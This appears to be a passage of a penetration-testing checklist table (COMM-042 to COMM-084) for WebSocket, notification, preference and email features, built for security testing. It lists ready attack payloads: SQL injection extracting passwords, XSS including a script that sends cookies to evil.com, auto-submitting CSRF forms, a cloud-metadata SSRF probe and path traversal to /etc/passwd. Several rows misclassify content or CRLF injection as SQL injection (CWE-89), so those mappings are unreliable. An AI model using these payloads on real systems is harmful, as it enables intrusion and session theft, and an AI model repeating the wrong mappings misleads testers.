| COMM-042 | WebSocket SQL Injection via Message Parameters | Injection (WSTG-INPV-05) | Real-time Updates (WebSocket) | 1. Send WebSocket messages containing SQL injection payloads in message parameters.<br>2. Use parameters that may trigger database queries such as search or filter.<br>3. Monitor for SQL errors or data extraction. | Application must use parameterized queries for all database operations triggered by WebSocket messages. | <code>Send {"action":"search",query:"' OR 1=1--"} or {"filter":"test' UNION SELECT password FROM users--"} via WebSocket</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;wscat;Custom Scripts | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| COMM-043 | WebSocket Session Fixation | Session Management (WSTG-SESS-03) | Real-time Updates (WebSocket) | 1. Establish a WebSocket connection and capture the session or connection token.<br>2. Share this token with another client.<br>3. Check if the second client can hijack the WebSocket session.<br>4. Verify session isolation. | Application must bind WebSocket sessions to authenticated users and prevent session sharing or fixation attacks. | <code>Share ws_session_token or connection_id between two different clients and check if both receive same user's updates</code> | Session fixation/hijack -&gt; attacker rides the victim's authenticated session. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;wscat;Custom Scripts | CWE-384; [Account Takeover kit](#/checklist/ato); PortSwigger Session management |
| COMM-044 | Sensitive Data Exposure in WebSocket Messages | Information Disclosure (WSTG-INFO-05) | Real-time Updates (WebSocket) | 1. Monitor all WebSocket messages received.<br>2. Check for sensitive data like personal information or payment details or internal system data.<br>3. Verify data minimization. | WebSocket messages must contain only the minimum necessary data and must not transmit sensitive information in plain text. | <code>Monitor WebSocket messages for full_name;email;address;card_number;internal_ids;debug_data in message payloads</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;wscat;Browser DevTools | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| COMM-045 | WebSocket XSS via Real-time Message Display | Cross-Site Scripting (WSTG-INPV-02) | Real-time Updates (WebSocket) | 1. Send a WebSocket message containing XSS payload.<br>2. Check if the message is displayed to other connected users in real-time.<br>3. Verify if the payload executes in the recipient's browser. | Application must sanitize and encode all WebSocket message content before rendering in the DOM. | <code>Send {"message":"&lt;img src=x onerror=alert(document.cookie)&gt;"} via WebSocket and check if XSS fires on recipient's browser</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;wscat;XSS Hunter | CWE-79; [XSS kit](#/checklist/xss); PortSwigger XSS; Cure53 |
| COMM-046 | IDOR on Notification Center Access | Broken Access Control (WSTG-AUTHZ-04) | Notification Center | 1. Access own notification center.<br>2. Intercept the API request.<br>3. Change user_id or account_id to another user.<br>4. Check if another user's notification center data is returned. | Application must verify that the authenticated user can only access their own notification center. | <code>GET /api/notification-center?user_id=1002 with User A credentials;GET /api/users/1002/notifications</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| COMM-047 | Notification Center Pagination Data Leakage | Broken Access Control (WSTG-AUTHZ-04) | Notification Center | 1. Access notification center with pagination.<br>2. Set page_size to an extremely large number.<br>3. Check if notifications from other users leak through pagination.<br>4. Verify offset boundary handling. | Application must enforce maximum page sizes and ensure pagination only returns the authenticated user's notifications. | <code>GET /api/notifications?page=1&amp;limit=999999;GET /api/notifications?offset=-1&amp;limit=100000</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| COMM-048 | Stored XSS in Notification Center Display | Cross-Site Scripting (WSTG-INPV-02) | Notification Center | 1. Trigger notifications with XSS payloads in source data like product names or usernames or messages.<br>2. View the notification center.<br>3. Check if stored XSS executes when notifications are rendered. | Application must encode all dynamic content in notification center rendering to prevent stored cross-site scripting. | <code>Create product with name=&lt;svg/onload=alert(1)&gt;;update username to &lt;script&gt;fetch('https://evil.com/'+document.cookie)&lt;/script&gt;</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;XSS Hunter | CWE-79; [XSS kit](#/checklist/xss); PortSwigger XSS; Cure53 |
| COMM-049 | Notification Center CSRF for Bulk Actions | CSRF (WSTG-SESS-05) | Notification Center | 1. Craft a malicious page that auto-submits requests to mark all notifications as read or delete all notifications.<br>2. Lure victim to visit.<br>3. Check if CSRF protection exists on bulk actions. | Application must validate CSRF tokens on all notification center actions including bulk mark-as-read and bulk delete. | <code>&lt;form action='https://target.com/api/notifications/mark-all-read' method='POST'&gt;&lt;/form&gt;&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</code> | CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO. | Medium | 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N) | Burp Suite;Custom HTML | CWE-352; [CSRF kit](#/checklist/csrf); PortSwigger CSRF + SameSite |
| COMM-050 | Notification Center Search SQL Injection | Injection (WSTG-INPV-05) | Notification Center | 1. Use the notification center search functionality.<br>2. Inject SQL payloads in the search query.<br>3. Observe the response for SQL errors or data extraction. | Application must use parameterized queries for all notification search operations. | <code>GET /api/notifications/search?q=' OR 1=1--;GET /api/notifications?search=test' UNION SELECT email FROM users--</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | SQLMap;Burp Suite | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| COMM-051 | Unauthorized Notification Dismissal | Broken Access Control (WSTG-AUTHZ-04) | Notification Center | 1. Dismiss a notification from own center.<br>2. Intercept request and change notification_id to another user's notification.<br>3. Check if the other user's notification is dismissed. | Application must verify notification ownership before allowing dismissal or any modification. | <code>POST /api/notifications/NOTIF-2001/dismiss with User A credentials</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| COMM-052 | Notification Center Cache Poisoning | Caching (WSTG-ATHN-06) | Notification Center | 1. Access notification center and check caching headers.<br>2. Attempt to poison the cache with malicious content.<br>3. Check if other users receive the poisoned cached notifications. | Application must not cache user-specific notification data in shared caches and must use proper cache-control headers. | <code>Add X-Forwarded-Host: evil.com header;check Cache-Control headers for missing no-store directive on notification responses</code> | Web cache poisoning/deception -&gt; mass XSS/redirect or private-data disclosure. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Custom Scripts | CWE-524; [Web Cache kit](#/checklist/webcache); James Kettle Web Cache Poisoning/Deception |
| COMM-053 | IDOR on Read/Unread Status Modification | Broken Access Control (WSTG-AUTHZ-04) | Read / Unread Status | 1. Mark a notification as read.<br>2. Intercept the request and change notification_id to another user's notification.<br>3. Check if the other user's notification status is changed. | Application must verify that the authenticated user owns the notification before allowing status changes. | <code>PUT /api/notifications/NOTIF-2001/read with User A credentials</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| COMM-054 | Bulk Status Manipulation Without Authorization | Broken Access Control (WSTG-AUTHZ-04) | Read / Unread Status | 1. Send a bulk mark-as-read request.<br>2. Include notification IDs from other users in the array.<br>3. Check if cross-user status modification occurs. | Application must validate ownership of every notification in bulk status update operations. | <code>POST /api/notifications/bulk-read with ids=[NOTIF-1001;NOTIF-2001;NOTIF-3001] including other users' notifications</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| COMM-055 | Race Condition on Read Status Toggle | Business Logic (WSTG-BUSL-08) | Read / Unread Status | 1. Send concurrent requests to toggle read/unread status on the same notification.<br>2. Check for inconsistent state.<br>3. Verify data integrity after concurrent operations. | Application must handle concurrent read status updates atomically to prevent inconsistent states. | <code>Send 20 concurrent PUT /api/notifications/NOTIF-1001/toggle-read requests simultaneously</code> | Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend). | Low | 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N) | Turbo Intruder;Burp Suite | CWE-362; [Race Condition kit](#/checklist/racecondition); James Kettle Smashing the State Machine |
| COMM-056 | Status Change Without Authentication | Authentication (WSTG-ATHN-01) | Read / Unread Status | 1. Capture a read status change request.<br>2. Remove authentication tokens.<br>3. Replay the request without authentication.<br>4. Check if the status change is processed. | Application must require valid authentication for all read/unread status modification endpoints. | <code>Remove Authorization header from PUT /api/notifications/NOTIF-1001/read</code> | Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-640; [Account Takeover kit](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups |
| COMM-057 | Read Receipt Information Disclosure | Information Disclosure (WSTG-INFO-05) | Read / Unread Status | 1. If read receipts are visible check if read timestamp and device information are exposed.<br>2. Verify if one user can see when another user read a notification.<br>3. Check for excessive metadata. | Application must not expose detailed read receipt information to unauthorized users and minimize metadata in status responses. | <code>Check response for read_at_timestamp;device_info;ip_address;user_agent in read status API response</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| COMM-058 | IDOR on Notification Preference Modification | Broken Access Control (WSTG-AUTHZ-04) | Notification Preferences | 1. Update own notification preferences.<br>2. Intercept the request and change user_id to another user.<br>3. Check if the other user's notification preferences are modified. | Application must validate that preference updates apply only to the authenticated user's account. | <code>PUT /api/notification-preferences with user_id=1002 while authenticated as user 1001</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| COMM-059 | CSRF on Notification Preference Change | CSRF (WSTG-SESS-05) | Notification Preferences | 1. Craft a malicious page that disables all notification preferences for the victim.<br>2. Lure authenticated victim to visit.<br>3. Check if preferences are changed without victim's explicit consent. | Application must validate CSRF tokens on all notification preference change requests. | <code>&lt;form action='https://target.com/api/notification-preferences' method='POST'&gt;&lt;input name='email_enabled' value='false'&gt;&lt;input name='sms_enabled' value='false'&gt;&lt;input name='push_enabled' value='false'&gt;&lt;/form&gt;&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</code> | CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;Custom HTML | CWE-352; [CSRF kit](#/checklist/csrf); PortSwigger CSRF + SameSite |
| COMM-060 | Preference Injection for Unauthorized Channels | Input Validation (WSTG-INPV-01) | Notification Preferences | 1. Update notification preferences.<br>2. Add unexpected preference channels like admin_alerts or system_notifications.<br>3. Check if subscribing to privileged notification channels is possible. | Application must validate preference values against allowed channels and reject unauthorized channel subscriptions. | <code>Add notification_channels=["email";"sms";"admin_alerts";"system_debug";"internal_monitoring"] to preference update</code> | Improper input validation -&gt; downstream injection / logic abuse. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-20; [XSS kit](#/checklist/xss); OWASP Input Validation Cheat Sheet |
| COMM-061 | Mass Assignment on Preference Object | Mass Assignment (WSTG-INPV-01) | Notification Preferences | 1. Update notification preferences.<br>2. Add hidden parameters like is_admin=true or override_global=true or bypass_unsubscribe=true.<br>3. Check if unauthorized fields are accepted. | Application must whitelist allowed preference fields and ignore any unexpected parameters. | <code>Add is_admin=true&amp;override_global_settings=true&amp;receive_all_internal=true to preference update body</code> | Mass assignment / parameter pollution -&gt; privilege escalation (role/isAdmin/isVerified) or ownership takeover. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-915; [IDOR kit](#/checklist/idor); PortSwigger Mass assignment; OWASP API3 BOPLA |
| COMM-062 | Preference Storage XSS | Cross-Site Scripting (WSTG-INPV-02) | Notification Preferences | 1. Update notification preferences with XSS payload in custom label or channel name fields.<br>2. View preferences page.<br>3. Check if the payload executes. | Application must sanitize all preference data on input and encode on output. | <code>custom_channel_name=&lt;script&gt;alert(document.cookie)&lt;/script&gt;;label=&lt;img src=x onerror=alert(1)&gt;</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;XSS Hunter | CWE-79; [XSS kit](#/checklist/xss); PortSwigger XSS; Cure53 |
| COMM-063 | Preference Reset Without Re-authentication | Authentication (WSTG-ATHN-01) | Notification Preferences | 1. Reset all notification preferences to defaults.<br>2. Check if re-authentication or confirmation is required.<br>3. Try resetting via CSRF or without proper session validation. | Application must require re-authentication or explicit confirmation for bulk preference resets to prevent accidental or malicious changes. | <code>POST /api/notification-preferences/reset without additional authentication challenge</code> | Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat). | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-640; [Account Takeover kit](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups |
| COMM-064 | SQL Injection in Preference Filters | Injection (WSTG-INPV-05) | Notification Preferences | 1. If preferences have search or filter capabilities inject SQL payloads.<br>2. Observe responses for SQL errors or data leakage. | Application must use parameterized queries for all preference-related database operations. | <code>GET /api/notification-preferences?channel=' OR 1=1--;GET /api/preferences?type=email' UNION SELECT password FROM users--</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | SQLMap;Burp Suite | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| COMM-065 | Email Preference Change Without Verification | Business Logic (WSTG-BUSL-02) | Notification Preferences | 1. Change notification email address in preferences.<br>2. Check if the new email is used without verification.<br>3. Verify if sensitive notifications are sent to unverified email. | Application must verify new notification email addresses before activating them for sensitive communications. | <code>Change notification_email to attacker@evil.com without email verification step</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| COMM-066 | Digest Email IDOR | Broken Access Control (WSTG-AUTHZ-04) | Digest Emails (Daily/Weekly) | 1. Trigger a digest email for own account.<br>2. Intercept and change user_id to another user.<br>3. Check if another user's digest is generated or sent to the attacker. | Application must generate digest emails only for the authenticated user and verify ownership before processing. | <code>POST /api/digest/generate with user_id=1002 while authenticated as user 1001</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| COMM-067 | Digest Email Content Injection | Injection (WSTG-INPV-03) | Digest Emails (Daily/Weekly) | 1. Add items or activities with XSS or HTML payloads that will appear in digest emails.<br>2. Wait for or trigger the digest email.<br>3. Check if payloads render in the email. | Application must sanitize all aggregated content before including in digest email templates. | <code>Create activities with names like &lt;script&gt;alert(1)&lt;/script&gt; or &lt;a href='https://evil.com'&gt;Click here&lt;/a&gt; that appear in digest</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Email Client;XSS Hunter | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| COMM-068 | Digest Frequency Manipulation | Business Logic (WSTG-BUSL-01) | Digest Emails (Daily/Weekly) | 1. Set digest frequency to weekly.<br>2. Intercept the request and change frequency to every_minute or realtime.<br>3. Check if the application sends excessive digest emails. | Application must validate digest frequency against allowed values and enforce server-side rate controls. | <code>Change digest_frequency=weekly to digest_frequency=every_minute or digest_interval=1</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| COMM-069 | SSTI in Digest Email Template | Injection (WSTG-INPV-18) | Digest Emails (Daily/Weekly) | 1. Enter template syntax in data fields that aggregate into digest emails.<br>2. Trigger digest generation.<br>3. Check if template engine evaluates the injected expressions in the digest email. | Application must escape all template syntax in aggregated data before inserting into digest email templates. | <code>Create item with name={{config}} or description=${7&#42;7} and check digest email for template evaluation</code> | Server-side template injection -&gt; remote code execution on the app server. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Tplmap;Email Client | CWE-1336; [SSTI kit](#/checklist/ssti); PortSwigger SSTI (James Kettle) |
| COMM-070 | Digest Email Timing Attack for User Enumeration | Information Disclosure (WSTG-INFO-01) | Digest Emails (Daily/Weekly) | 1. Trigger digest generation for existing and non-existing accounts.<br>2. Compare response times.<br>3. Check if timing differences reveal account existence. | Application must ensure consistent processing times regardless of account existence to prevent enumeration. | <code>POST /api/digest/send?email=existing@test.com vs email=nonexistent@test.com timing comparison</code> | Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Custom Scripts | CWE-204; [Account Takeover kit](#/checklist/ato); OWASP WSTG-IDNT-04 |
| COMM-071 | Digest Unsubscribe Link Manipulation | Broken Access Control (WSTG-AUTHZ-04) | Digest Emails (Daily/Weekly) | 1. Use the unsubscribe link in a digest email.<br>2. Modify user parameters in the URL.<br>3. Check if other users can be unsubscribed from digests. | Application must use cryptographically signed unsubscribe tokens tied to specific users. | <code>Change /digest/unsubscribe?uid=1001&amp;token=abc to uid=1002&amp;token=abc</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Browser | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| COMM-072 | Transactional Email Phishing via Content Injection | Injection (WSTG-INPV-03) | Transactional Emails | 1. Trigger a transactional email like order confirmation or password reset.<br>2. Inject HTML or links in user-controlled fields that appear in the email.<br>3. Check if phishing content renders. | Application must sanitize all user-provided content before including in transactional email bodies. | <code>Set shipping_name=&lt;a href='https://evil.com/phishing'&gt;Click to verify your account&lt;/a&gt; in order details</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Email Client | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| COMM-073 | Transactional Email Replay Attack | Session Management (WSTG-SESS-03) | Transactional Emails | 1. Capture a transactional email trigger request.<br>2. Replay the same request multiple times.<br>3. Check if duplicate transactional emails are sent without rate limiting. | Application must implement idempotency checks to prevent duplicate transactional email sends from replayed requests. | <code>Replay POST /api/transactional-email/send with same parameters 50 times</code> | Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat). | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-640; [Account Takeover kit](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups |
| COMM-074 | Sensitive Data in Transactional Email | Information Disclosure (WSTG-INFO-05) | Transactional Emails | 1. Trigger all types of transactional emails.<br>2. Review each email for sensitive data exposure.<br>3. Check for plain-text passwords or full card numbers or internal system information. | Transactional emails must mask sensitive data and never contain plain-text credentials or full payment instrument details. | <code>Review password reset email for plain-text password;order email for full card number;account email for internal IDs</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Email Client;Manual Review | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| COMM-075 | Transactional Email Open Tracking Privacy Violation | Privacy (WSTG-INFO-05) | Transactional Emails | 1. Receive transactional emails.<br>2. Inspect for tracking pixels or unique identifiers.<br>3. Check if open tracking reveals user behavior to third parties. | Transactional emails should minimize tracking and comply with privacy regulations regarding email tracking. | <code>Search email HTML source for 1x1 pixel images;unique tracking parameters;third-party tracking domains</code> | Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Email Client;Burp Suite | CWE-359; [IDOR kit](#/checklist/idor); OWASP Privacy Risks; GDPR |
| COMM-076 | Transactional Email SSRF via Template Images | SSRF (WSTG-INPV-19) | Transactional Emails | 1. If transactional emails allow custom image URLs inject internal URLs.<br>2. Trigger the email.<br>3. Check if the email server fetches the internal resource when rendering the email. | Application must validate and whitelist all image URLs used in transactional email templates. | <code>Set profile_image=http://169.254.169.254/latest/meta-data/ or logo_url=http://localhost:3306/ in fields included in email</code> | SSRF -&gt; internal-service reach / cloud metadata credential theft. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Collaborator | CWE-918; [SSRF kit](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger |
| COMM-077 | Email Template Path Traversal | Path Traversal (WSTG-INPV-10) | Transactional Emails | 1. If the email template name or ID is a parameter intercept and modify it.<br>2. Attempt path traversal to load arbitrary templates.<br>3. Check for file inclusion. | Application must validate template identifiers against an allowed list and prevent path traversal in template loading. | <code>template=../../../etc/passwd;template_id=../../../../app/config/database.yml</code> | Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-22; [Path Traversal kit](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai |
| COMM-078 | Marketing Email Unsubscribe Bypass | Business Logic (WSTG-BUSL-02) | Marketing Emails | 1. Unsubscribe from marketing emails.<br>2. Check if marketing emails continue to be sent.<br>3. Verify if re-subscription happens without explicit consent.<br>4. Test CAN-SPAM/GDPR compliance. | Application must honor unsubscribe requests immediately and permanently and comply with email marketing regulations. | <code>Unsubscribe via /marketing/unsubscribe then check for continued marketing emails over 30-day period</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Email Client;Manual Testing | CWE-840; PortSwigger Business logic |
| COMM-079 | Marketing Email List Injection | Injection (WSTG-INPV-11) | Marketing Emails | 1. If the subscription form accepts email addresses inject multiple email addresses.<br>2. Use CRLF or comma separation to add additional recipients.<br>3. Check if injected addresses receive marketing emails. | Application must validate that only a single valid email address is submitted per subscription request. | <code>email=user@test.com%0d%0aCc:victim1@test.com;email=user@test.com,victim2@test.com,victim3@test.com</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Custom Scripts | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| COMM-080 | Marketing Email Content XSS | Cross-Site Scripting (WSTG-INPV-02) | Marketing Emails | 1. If marketing email content includes user data like name or preferences inject XSS payloads.<br>2. Trigger the marketing email.<br>3. Open in webmail.<br>4. Check for script execution. | Application must sanitize all user-derived content before including in marketing email templates. | <code>Set display_name=&lt;script&gt;alert('XSS')&lt;/script&gt; or preferences=&lt;img src=x onerror=alert(1)&gt; and trigger marketing email</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;XSS Hunter;Email Client | CWE-79; [XSS kit](#/checklist/xss); PortSwigger XSS; Cure53 |
| COMM-081 | Marketing Email Subscription CSRF | CSRF (WSTG-SESS-05) | Marketing Emails | 1. Craft a malicious page that auto-subscribes the victim to unwanted marketing email lists.<br>2. Lure victim to visit.<br>3. Check if subscription occurs without explicit consent. | Application must require explicit user action and CSRF protection for marketing email subscriptions. | <code>&lt;img src='https://target.com/api/marketing/subscribe?email=victim@test.com&amp;list=all'&gt;;auto-submit subscription form</code> | CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO. | Medium | 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N) | Burp Suite;Custom HTML | CWE-352; [CSRF kit](#/checklist/csrf); PortSwigger CSRF + SameSite |
| COMM-082 | Marketing Email Subscriber List Exposure | Information Disclosure (WSTG-INFO-05) | Marketing Emails | 1. Check if marketing email subscriber endpoints expose the full subscriber list.<br>2. Try accessing admin subscriber management endpoints.<br>3. Look for data export functionality. | Application must restrict subscriber list access to authorized admin roles and prevent unauthorized data extraction. | <code>GET /api/marketing/subscribers;GET /api/admin/email-lists;GET /api/marketing/export with regular user credentials</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;DirBuster | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| COMM-083 | Email Preference Center IDOR | Broken Access Control (WSTG-AUTHZ-04) | Marketing Emails | 1. Access own email preference center.<br>2. Change the user identifier in the URL or request.<br>3. Check if another user's marketing preferences can be viewed or modified. | Application must validate user identity before displaying or modifying marketing email preferences. | <code>Change /marketing/preferences?uid=1001 to uid=1002;modify token in preference center URL</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Browser | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| COMM-084 | Marketing Email Rate Abuse for Spam | Business Logic (WSTG-BUSL-05) | Marketing Emails | 1. Trigger marketing email sends via any available mechanism.<br>2. Target external email addresses.<br>3. Check if the application can be used as a spam relay. | Application must prevent abuse of email sending capabilities and implement strict controls on who can trigger marketing emails. | <code>Use subscription confirmation or referral features to send unwanted emails to arbitrary addresses at scale</code> | Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Custom Scripts | CWE-799; [Account Takeover kit](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger |
